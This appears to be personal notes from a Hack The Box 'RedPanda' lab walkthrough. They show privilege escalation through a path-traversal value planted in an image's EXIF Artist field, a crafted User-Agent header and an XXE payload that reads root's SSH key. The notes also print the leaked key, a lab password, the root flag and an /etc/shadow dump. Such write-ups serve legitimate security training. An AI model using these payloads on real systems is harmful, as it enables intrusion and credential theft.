2022/11/08 22:10:01 CMD: UID=1000 PID=7519   | /bin/bash /opt/cleanup.sh 
2022/11/08 22:10:01 CMD: UID=1000 PID=7522   | /bin/bash /opt/cleanup.sh 
2022/11/08 22:10:01 CMD: UID=1000 PID=7525   | /bin/bash /opt/cleanup.sh 
2022/11/08 22:10:01 CMD: UID=1000 PID=7526   | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ;                                                                            
2022/11/08 22:10:01 CMD: UID=???  PID=7527   | ???
2022/11/08 22:10:01 CMD: UID=1000 PID=7532   | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ;                                                                            
2022/11/08 22:10:01 CMD: UID=1000 PID=7534   | /bin/bash /opt/cleanup.sh 
2022/11/08 22:10:01 CMD: UID=1000 PID=7536   | /usr/bin/find /dev/shm -name *.jpg -exec rm -rf {} ;                                                                                 
2022/11/08 22:10:01 CMD: UID=1000 PID=7537   | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;                                                                            
2022/11/08 22:12:01 CMD: UID=0    PID=7542   | /usr/sbin/CRON -f 
2022/11/08 22:12:01 CMD: UID=0    PID=7543   | /usr/sbin/CRON -f 
2022/11/08 22:12:01 CMD: UID=0    PID=7545   | /bin/sh /root/run_credits.sh 
2022/11/08 22:12:01 CMD: UID=0    PID=7544   | /bin/sh /root/run_credits.sh

Mirando esta configuración podemos inyectar en el campo "Artist", una ruta donde estará el xml, esto en una imagen cualquiera 

┌──(kali㉿kali)-[~/hackthebox]
└─$ wget "https://avatars.githubusercontent.com/u/95899548?v=4"
--2022-11-08 17:16:37--  https://avatars.githubusercontent.com/u/95899548?v=4
Resolving avatars.githubusercontent.com (avatars.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
Connecting to avatars.githubusercontent.com (avatars.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 33411 (33K) [image/jpeg]
Saving to: ‘95899548?v=4’

95899548?v=4           100%[==========================>]  32.63K  --.-KB/s    in 0.04s   

2022-11-08 17:16:38 (748 KB/s) - ‘95899548?v=4’ saved [33411/33411]

                                                                                          
┌──(kali㉿kali)-[~/hackthebox]
└─$ mv 95899548?v=4 gato.jpg        

                                                                                          
┌──(kali㉿kali)-[~/hackthebox]
└─$ exiftool -Artist="../home/woodenk/privesc" gato.jpg
    1 image files updated
                                                                                          
┌──(kali㉿kali)-[~/hackthebox]
└─$ exiftool gato.jpg                                  
ExifTool Version Number         : 12.49
File Name                       : gato.jpg
Directory                       : .
File Size                       : 34 kB
File Modification Date/Time     : 2022:11:08 17:17:33-05:00
File Access Date/Time           : 2022:11:08 17:17:33-05:00
File Inode Change Date/Time     : 2022:11:08 17:17:33-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : ../home/woodenk/privesc
Y Cb Cr Positioning             : Centered
Image Width                     : 396
Image Height                    : 396
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 396x396
Megapixels                      : 0.157

┌──(kali㉿kali)-[~/hackthebox]
└─$ scp gato.jpg woodenk@10.10.11.170:.
woodenk@10.10.11.170's password: RedPandazRule
gato.jpg                                                100%   33KB  57.1KB/s   00:00 

woodenk@redpanda:~$ ls
gato.jpg  user.txt

XML External Injection
crear en el home un archivo xml que apunte a la id_rsa de root

┌──(kali㉿kali)-[~/hackthebox]
└─$ cat privesc_creds.xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/gato.jpg</uri>
    <privesc>&key;</privesc>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>

┌──(kali㉿kali)-[~/hackthebox]
└─$ scp privesc_creds.xml woodenk@10.10.11.170:. 
woodenk@10.10.11.170's password: RedPandazRule
privesc_creds.xml                                       100%  292     1.5KB/s   00:00 

curl with User-Agent

woodenk@redpanda:~$ curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/gato.jpg"
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta author="wooden_k">
    <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
    <link rel="stylesheet" href="css/panda.css" type="text/css">
    <link rel="stylesheet" href="css/main.css" type="text/css">
    <title>Red Panda Search | Made with Spring Boot</title>
  </head>
  <body>

    <div class='pande'>
      <div class='ear left'></div>
      <div class='ear right'></div>
      <div class='whiskers left'>
          <span></span>
          <span></span>
          <span></span>
      </div>
      <div class='whiskers right'>
        <span></span>
        <span></span>
        <span></span>
      </div>
      <div class='face'>
        <div class='eye left'></div>
        <div class='eye right'></div>
        <div class='eyebrow left'></div>
        <div class='eyebrow right'></div>

        <div class='cheek left'></div>
        <div class='cheek right'></div>

        <div class='mouth'>
          <span class='nose'></span>
          <span class='lips-top'></span>
        </div>
      </div>
    </div>
    <h1>RED PANDA SEARCH</h1>
    <div class="wrapper" >
    <form class="searchForm" action="/search" method="POST">
    <div class="wrap">
      <div class="search">
        <input type="text" name="name" placeholder="Search for a red panda">
        <button type="submit" class="searchButton">
          <i class="fa fa-search"></i>
        </button>
      </div>
    </div>
    </form>
    </div>
  </body>
</html>

damian and woodenk so author must bedamian to get private key

after 2 or 3 minutes

woodenk@redpanda:~$ cat privesc_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!--?xml version="1.0" ?-->
<!DOCTYPE replace>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/gato.jpg</uri>
    <privesc>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</privesc>
    <views>1</views>
  </image>
  <totalviews>1</totalviews>
</credits>

root

┌──(kali㉿kali)-[~/hackthebox]
└─$ nano id_rsa           
                                                                                          
┌──(kali㉿kali)-[~/hackthebox]
└─$ cat id_rsa                                                                  
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----

┌──(kali㉿kali)-[~/hackthebox]
└─$ ssh root@10.10.11.170 -i id_rsa
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 08 Nov 2022 10:47:43 PM UTC

  System load:           0.0
  Usage of /:            87.0% of 4.30GB
  Memory usage:          74%
  Swap usage:            0%
  Processes:             245
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.170
  IPv6 address for eth0: dead:beef::250:56ff:feb9:1c59

  => / is using 87.0% of 4.30GB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jun 30 13:17:41 2022
root@redpanda:~# id
uid=0(root) gid=0(root) groups=0(root)
root@redpanda:~# ls
root.txt  run_credits.sh
root@redpanda:~# cat run_credits.sh 
cd /opt/credit-score/LogParser/final
java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
echo '' > /opt/panda_search/redpanda.log
root@redpanda:~# cat root.txt 
90509ad9a3166bd5cac0eb155d4656f8

root@redpanda:~# cat /etc/shadow
root:$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
sys:*:18375:0:99999:7:::
sync:*:18375:0:99999:7:::
games:*:18375:0:99999:7:::
man:*:18375:0:99999:7:::
lp:*:18375:0:99999:7:::
mail:*:18375:0:99999:7:::
news:*:18375:0:99999:7:::
uucp:*:18375:0:99999:7:::
proxy:*:18375:0:99999:7:::
www-data:*:18375:0:99999:7:::
backup:*:18375:0:99999:7:::
list:*:18375:0:99999:7:::
irc:*:18375:0:99999:7:::
gnats:*:18375:0:99999:7:::
nobody:*:18375:0:99999:7:::
systemd-network:*:18375:0:99999:7:::
systemd-resolve:*:18375:0:99999:7:::
systemd-timesync:*:18375:0:99999:7:::
messagebus:*:18375:0:99999:7:::
syslog:*:18375:0:99999:7:::
_apt:*:18375:0:99999:7:::
tss:*:18375:0:99999:7:::
uuidd:*:18375:0:99999:7:::
tcpdump:*:18375:0:99999:7:::
landscape:*:18375:0:99999:7:::
pollinate:*:18375:0:99999:7:::
sshd:*:18389:0:99999:7:::
systemd-coredump:!!:18389::::::
lxd:!:18389::::::
usbmux:*:18822:0:99999:7:::
woodenk:$6$48BoRAl2LvBK8Zth$vpJzroFTUyQRA/UQKu64uzNF6L7pceYAe.B14kmSgvKCvjTm6Iu/hSEZTTT8EFbGKNIbT3e2ox3qqK/MJRJIJ1:19157:0:99999:7:::
mysql:!:19157:0:99999:7:::



```

![[Pasted image 20221108153905.png]]

![[Pasted image 20221108174913.png]]



[[Shoppy]]